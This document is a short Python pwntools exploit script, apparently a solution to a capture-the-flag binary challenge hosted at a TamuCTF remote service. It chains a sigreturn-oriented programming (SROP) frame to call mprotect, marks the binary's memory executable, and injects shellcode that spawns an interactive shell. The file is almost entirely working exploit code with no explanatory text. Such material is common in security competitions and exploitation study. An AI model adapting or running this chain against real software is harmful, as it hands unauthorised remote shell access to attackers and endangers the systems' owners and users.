from pwn import *
import time

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
break *0x401018
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote("tamuctf.com", 443, ssl=True, sni="void")
    else:
        return process(e.path)

p = start()

'''0x401000: mov rax, 0; mov rdi, 0; mov rsi, rsp; mov rdx, 0x7d0; syscall; 
   rax = sys_read, rdi = fd = stdin, rsi = char* = 'rsp', rdx = len = 0x7d40 '''
sys_read = 0x401000

'''0x401018: syscall; ret'''
syscall_ret = 0x401018

start = 0x400020 
entry = 0x400018 

'''stack_adjust + shellcode '''
shellcode = asm('add rsp,0x68')
shellcode += asm(shellcraft.sh())

def pause(stage):
    print("[+] Pausing Before Sending Stage: %s" %stage)
    if args.GDB:
       raw_input("[+] Press [Enter] To Send")
    else:
       time.sleep(0.1)

def srop_mprotect():
    chain = p64(sys_read)
    chain += p64(syscall_ret) 

    '''sys_mprotect(rdi=start,rsi=len(shellcode),rdx=prot=RWX)'''
    frame = SigreturnFrame()
    frame.rip = syscall_ret
    frame.rsp = entry
    frame.rax = constants.SYS_mprotect
    frame.rdi = e.address 
    frame.rsi = len(shellcode) 
    frame.rdx = 7

    p.send(chain + bytes(frame))

def read_15_bytes():
    pause("Reading 15 Bytes (rax=0xf=sys_rt_sigreturn) ")
    chain=p64(syscall_ret).ljust(constants.SYS_rt_sigreturn) 
    p.send(chain)

def exec_shellcode():
    pause("Shellcode")
    p.send(p64(start) + shellcode)

srop_mprotect()
read_15_bytes()
exec_shellcode()

p.interactive()





